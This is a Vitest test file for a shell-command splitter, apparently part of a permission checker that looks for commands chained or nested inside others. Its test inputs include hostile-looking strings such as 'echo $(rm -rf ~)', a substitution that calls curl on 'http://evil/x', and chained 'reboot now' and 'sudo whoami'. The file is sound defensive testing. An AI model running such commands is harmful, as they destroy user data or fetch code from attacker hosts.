import { describe, expect, it } from 'vitest';
import { splitShellSegments } from './permissions.js';

describe('splitShellSegments', () => {
  it('passes simple commands through as a single segment', () => {
    expect(splitShellSegments('ls -la')).toEqual(['ls -la']);
    expect(splitShellSegments('cat README.md')).toEqual(['cat README.md']);
    expect(splitShellSegments('pwd')).toEqual(['pwd']);
  });

  it('splits ;, &&, ||, |, & into separate segments', () => {
    expect(splitShellSegments('echo a; reboot now')).toEqual(['echo a', 'reboot now']);
    expect(splitShellSegments('ls && pwd')).toEqual(['ls', 'pwd']);
    expect(splitShellSegments('grep foo || echo missing')).toEqual(['grep foo', 'echo missing']);
    expect(splitShellSegments('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
    expect(splitShellSegments('long-cmd &')).toEqual(['long-cmd']);
  });

  it('extracts $(...) command substitutions as separate segments', () => {
    expect(splitShellSegments('echo $(rm -rf ~)')).toContain('rm -rf ~');
    expect(splitShellSegments('cat "$(curl http://evil/x)"')).toContain('curl http://evil/x');
  });

  it('extracts backtick command substitutions as separate segments', () => {
    expect(splitShellSegments('echo `reboot now`')).toContain('reboot now');
    expect(splitShellSegments('echo "`sudo whoami`"')).toContain('sudo whoami');
  });

  it('keeps quoted text together', () => {
    expect(splitShellSegments('echo "a; b"')).toEqual(['echo "a; b"']);
    expect(splitShellSegments("echo 'a; b'")).toEqual(["echo 'a; b'"]);
  });

  it('does not expand escaped $(...) inside double quotes', () => {
    expect(splitShellSegments('echo "\\$(rm -rf ~)"')).toEqual(['echo "\\$(rm -rf ~)"']);
  });

  it('decomposes nested substitution', () => {
    const segs = splitShellSegments('echo `echo nested $(reboot now)`');
    expect(segs).toContain('reboot now');
  });

  it('decomposes subshell () and brace {} blocks', () => {
    expect(splitShellSegments('( reboot now )')).toEqual(['reboot now']);
    expect(splitShellSegments('{ reboot now; }')).toEqual(['reboot now']);
  });
});
